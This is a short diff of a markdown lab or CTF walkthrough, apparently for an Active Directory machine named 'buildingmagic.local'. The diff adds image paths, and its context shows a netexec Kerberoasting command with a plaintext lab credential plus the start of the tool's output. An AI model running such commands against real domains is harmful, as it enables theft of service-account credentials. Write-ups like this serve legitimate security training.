@@ -220,14 +220,14 @@ domain_computers.html        domain_groups.html     domain_policy.html  domain_t
 ```bash
 open domain_users.html
 ```
-![image2.png]()
+![image2.png](bm-images/image2.png)
 
 ---
 
 ## Exploitation & Lateral Movement
 
 ### Attack: Kerberoasting
-![image3.png]()
+![image3.png](bm-images/image3.png)
 ```bash
 nxc ldap buildingmagic.local -u r.widdleton -p 'lilronron' --kerberoasting output.txt
 LDAP        10.0.29.68      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:None) (channel binding:No TLS cert)                                                                                                                                             
